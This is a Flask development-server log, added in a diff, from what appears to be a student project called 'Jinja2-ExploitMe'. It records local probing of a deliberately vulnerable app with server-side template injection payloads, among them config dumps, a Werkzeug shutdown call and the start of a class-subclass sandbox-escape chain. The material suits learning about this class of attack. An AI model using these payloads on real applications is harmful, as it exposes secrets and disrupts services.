@@ -1,0 +1,134 @@
+➜  Jinja2-ExploitMe git:(master) export FLASK_ENV=development; flask run
+ * Environment: development
+ * Debug mode: on
+ * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 127-550-023
+127.0.0.1 - - [07/Apr/2020 16:25:11] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 16:25:11] "GET /static/hacker.jpg HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 16:25:12] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 -
+127.0.0.1 - - [07/Apr/2020 16:25:12] "GET /apple-touch-icon.png HTTP/1.1" 404 -
+127.0.0.1 - - [07/Apr/2020 16:25:12] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [07/Apr/2020 16:25:23] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 16:25:36] "GET /?exploit=2*2 HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 16:25:36] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [07/Apr/2020 16:25:55] "GET /?exploit=(2*2) HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 16:25:55] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [07/Apr/2020 16:28:15] "GET /?exploit=(2*2) HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 16:28:17] "GET /?exploit=blah HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 16:28:17] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [07/Apr/2020 16:28:49] "GET /?exploit=blah HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 16:29:04] "GET /?exploit=int(2)*int(2) HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 16:29:04] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [07/Apr/2020 16:36:07] "GET /?{{2*2}} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 16:36:27] "GET /?exploit={{2*2}} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 16:45:00] "GET /?exploit={{2*2}} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 16:48:12] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 16:49:21] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 16:49:37] "GET /?exploit={{2*%272%27}} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 16:50:29] "GET /?exploit={{7*%277%27}} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 16:51:37] "GET /?exploit={{7*7}} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 16:51:48] "GET /?exploit={{7*%277%27}} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 16:51:59] "GET /?exploit={{7*`7`}} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 16:53:31] "GET /?exploit=%27{{7*`7`}} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 16:55:32] "GET /?exploit=%}wassup HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 16:55:42] "GET /?exploit=idk HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 16:55:42] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [07/Apr/2020 18:10:17] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 18:10:17] "GET /static/hacker.jpg HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 18:10:17] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [07/Apr/2020 18:10:46] "GET /?exploit={{7*%277%27}} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 18:12:13] "GET /?exploit={{%20request.environ[%27werkzeug.server.shutdown%27]()%20}} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 18:12:18] "GET /?exploit={{%20request.environ[%27werkzeug.server.shutdown%27]()%20}} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 18:12:56] "GET /?exploit={%%202%20*%20%272%27%20%} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 18:22:13] "GET /?exploit={{%20config.items()%20}} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 18:26:03] "GET /?exploit={{%20config.items(%27EXPLAIN_TEMPLATE_LOADING%27:True)%20}} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 18:26:59] "GET /?exploit={{%207%20*%20%277%27%20}} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 18:27:27] "GET /?exploit={%%20extends%20%27base.html%27%20%} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 18:29:05] "GET /?exploit={%%20macro%20hello(name)%20%}Hello%20{{%20name%20}}!{%%20endmacro%20%} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 18:29:11] "GET /?exploit={%%20macro%20hello(name)%20%}Hello%20{{%20name%20}}!{%%20endmacro%20%} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 18:29:56] "GET /?{%%20macro%20hello(name)%20%}Hello%20{{%20name%20}}!{%%20endmacro%20%} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 18:30:10] "GET /?exploit={{%20config.items()%20}} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 18:32:37] "GET /?exploit={{%20config.from_object(%27os%27)%20}} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 18:32:42] "GET /?exploit={{%20config.from_object(%27os%27)%20}} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 18:33:09] "GET /?exploit={{%20config.items()%20}} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 18:45:50] "GET /?exploit={{7*%277%27}} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 18:46:14] "GET /?exploit={{(7*%277%27)}} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 18:48:50] "GET /?exploit={{%20[].class.base.subclasses()%20}} HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/Users/elaine/school-projects/Spring2020/BEW-2-3/Jinja2-ExploitMe/app.py", line 29, in index
+    render_template_string(rendered_template)
+  File "/usr/local/lib/python3.7/site-packages/flask/templating.py", line 155, in render_template_string
+    return _render(ctx.app.jinja_env.from_string(source), context, ctx.app)
+  File "/usr/local/lib/python3.7/site-packages/flask/templating.py", line 120, in _render
+    rv = template.render(context)
+  File "/usr/local/lib/python3.7/site-packages/jinja2/asyncsupport.py", line 76, in render
+    return original_render(self, *args, **kwargs)
+  File "/usr/local/lib/python3.7/site-packages/jinja2/environment.py", line 1008, in render
+    return self.environment.handle_exception(exc_info, True)
+  File "/usr/local/lib/python3.7/site-packages/jinja2/environment.py", line 780, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib/python3.7/site-packages/jinja2/_compat.py", line 37, in reraise
+    raise value.with_traceback(tb)
+  File "<template>", line 57, in top-level template code
+
+  File "/usr/local/lib/python3.7/site-packages/jinja2/environment.py", line 430, in getattr
+    return getattr(obj, attribute)
+jinja2.exceptions.UndefinedError: 'list object' has no attribute 'class'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.7/site-packages/flask/app.py", line 2463, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.7/site-packages/flask/app.py", line 2449, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.7/site-packages/flask/app.py", line 1866, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib/python3.7/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/usr/local/lib/python3.7/site-packages/flask/app.py", line 2446, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.7/site-packages/flask/app.py", line 1951, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.7/site-packages/flask/app.py", line 1820, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib/python3.7/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/usr/local/lib/python3.7/site-packages/flask/app.py", line 1949, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.7/site-packages/flask/app.py", line 1935, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/Users/elaine/school-projects/Spring2020/BEW-2-3/Jinja2-ExploitMe/app.py", line 33, in index
+    return render_template_string(rendered_template)
+  File "/usr/local/lib/python3.7/site-packages/flask/templating.py", line 155, in render_template_string
+    return _render(ctx.app.jinja_env.from_string(source), context, ctx.app)
+  File "/usr/local/lib/python3.7/site-packages/flask/templating.py", line 120, in _render
+    rv = template.render(context)
+  File "/usr/local/lib/python3.7/site-packages/jinja2/asyncsupport.py", line 76, in render
+    return original_render(self, *args, **kwargs)
+  File "/usr/local/lib/python3.7/site-packages/jinja2/environment.py", line 1008, in render
+    return self.environment.handle_exception(exc_info, True)
+  File "/usr/local/lib/python3.7/site-packages/jinja2/environment.py", line 780, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib/python3.7/site-packages/jinja2/_compat.py", line 37, in reraise
+    raise value.with_traceback(tb)
+  File "<template>", line 57, in top-level template code
+
+  File "/usr/local/lib/python3.7/site-packages/jinja2/environment.py", line 430, in getattr
+    return getattr(obj, attribute)
+jinja2.exceptions.UndefinedError: 'list object' has no attribute 'class'
+127.0.0.1 - - [07/Apr/2020 18:48:50] "GET /?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 18:48:50] "GET /?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 18:48:50] "GET /?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 18:48:50] "GET /?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 18:48:50] "GET /?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 18:48:50] "GET /?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 19:24:03] "GET /?exploit={{%27%27.class.mro()[1].subclasses()}} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 19:24:09] "GET /?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 19:26:15] "GET /?exploit={{context=%22hack.txt%22}} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 19:27:30] "GET /?exploit={{%20{%%20url%20%22hack.txt%22}} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 19:27:38] "GET /?exploit={{%20{%%20url%20%22hack.txt%22%20%}%20}} HTTP/1.1" 200 -
+127.0.0.1 - - [07/Apr/2020 19:28:51] "GET /?exploit={{%3Cimg%20src=%22hacker.jpg%22%3E}} HTTP/1.1" 200 -
+^C%                                                                                   
